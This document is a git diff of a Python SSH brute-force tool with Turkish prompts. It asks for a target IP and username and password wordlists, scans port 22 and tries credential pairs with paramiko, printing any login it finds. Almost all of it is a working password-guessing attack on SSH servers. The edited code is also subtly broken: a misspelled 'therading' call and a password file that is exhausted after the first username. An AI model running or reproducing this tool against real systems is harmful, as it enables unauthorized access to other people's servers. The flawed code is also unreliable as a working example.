@@ -1,6 +1,7 @@
-import socket
-from colorama import Fore
-import paramiko
+import socket  
+from colorama import Fore  
+import paramiko  
+import threading  
 
 ip = input("Hedef İp Giriniz : ")
 port = 22
@@ -17,33 +18,30 @@ def port_tara(ip, port):
         exit()
         
         
-port_tara(ip, port)
-
-
 usernamelist = input("SSH kullanıcı adı wordlistini giriniz: ")
 passwordlist = input("SSH şifre wordlistini giriniz: ")
 
-
-
 def ssh_brute():
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     with open(usernamelist, 'r') as users:
         with open(passwordlist, 'r') as passwords:
             for username in users:
                 username = username.strip() 
                 for password in passwords:
                     password = password.strip()
-                    ssh = paramiko.SSHClient()
-                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                    
                     try:
                         ssh.connect(hostname=ip, port=port, username=username, password=password)
                         print(Fore.GREEN + "[✓] Başarılı. Şifre ve Kullanıcı adı Bulundu ", "Kullanıcı Adı:", username, "Şifre:", password)
-                        ssh.close()  
-                        return  
+                        ssh.close()
+                        return
                     except paramiko.AuthenticationException:
                         print(Fore.RED + "[×] Başarısız Kullanıcı adı ve Şifre Bulunamadı")
                     except paramiko.SSHException as e:
                         print(Fore.RED + f"[×] SSH bağlantı hatası: {e}")
-
-
-ssh_brute()
+                        
+                        
+port_tara(ip, port)
+start = therading.Thread(target=ssh_brute)
+start.start()
+                  
